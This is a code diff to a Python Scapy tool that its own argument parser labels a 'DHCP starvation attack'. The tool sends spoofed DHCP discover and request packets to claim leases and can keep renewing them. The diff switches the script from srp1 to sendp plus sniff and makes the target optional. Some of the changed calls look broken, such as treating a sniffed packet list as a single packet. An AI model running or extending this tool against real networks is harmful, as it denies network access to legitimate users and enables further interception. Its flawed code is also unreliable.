@@ -64,21 +64,24 @@ def get_ip_address(mac, args) -> (str, str):
     target = "255.255.255.255"
     if args.target:
         target = args.target
-    xid = random.randint(0, 30000)
+    x_id = random.randint(0, 30000)
     # craft dhcp discover packet
     dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) / IP(src="0.0.0.0", dst=target) / UDP(sport=68, dport=67) / BOOTP(
-        op=1, chaddr=mac, xid=xid) / DHCP(options=[("message-type", "discover"), ("end")])
+        op=1, chaddr=mac, xid=x_id) / DHCP(options=[("message-type", "discover"), ("end")])
 
     # send the dhcp discover packet
-    offer = srp1(dhcp_discover, iface=args.iface, timeout=1, verbose=1)
+    sendp(dhcp_discover, iface=args.iface, verbose=1)
+    offer = sniff(count=1, lfilter=lambda x: BOOTP in x and x[BOOTP].xid == x_id, timeout=3)
+    time.sleep(2)
     print(offer.show())
     if offer:
         # craft dhcp request packet
         dhcp_request = Ether(dst=offer.src, src=mac) / IP(src="0.0.0.0", dst=args.target) / UDP(sport=68, dport=67) / BOOTP(
-            op=1, chaddr=mac, xid=xid) / DHCP(options=[("message-type", "request"), ("requested_addr", offer.getlayer(BOOTP).yiaddr),
+            op=1, chaddr=mac, xid=x_id) / DHCP(options=[("message-type", "request"), ("requested_addr", offer.getlayer(BOOTP).yiaddr),
                                                          ("server_id", offer.getlayer(BOOTP).siaddr), ("end")])
 
-        ack = srp1(dhcp_request, iface=args.iface, timeout=1, verbose=0)
+        scapy.sendp(dhcp_request, iface=args.iface, timeout=1, verbose=0)
+        ack = sniff(count=1, lfilter=lambda x: BOOTP in x and x[BOOTP].xid == x_id, timeout=3)
         if ack:
             # return the ip address and the lease time
             return offer.getlayer(BOOTP).yiaddr, offer.getlayer(BOOTP).options[-1][1]
@@ -106,10 +109,10 @@ def renew(lease_time, ip, mac, args):
 
 def main():
     # initialize argument parser for command line
-    parser = argparse.ArgumentParser(description="Spoof ARP tables")
+    parser = argparse.ArgumentParser(description="DHCP starvation attack")
     parser.add_argument("-i", "--iface", help="Interface you wish to use", choices=get_if_list())
     parser.add_argument("-p", "--persist", help="Renew the attack if about to end")
-    parser.add_argument("-t", "--target", help="IP of target", type=validate_ip_address, required=True)
+    parser.add_argument("-t", "--target", help="IP of target", type=validate_ip_address)
 
     args = parser.parse_args()
     starve(args)
@@ -117,3 +120,5 @@ def main():
 
 if __name__ == "__main__":
     main()
+
+
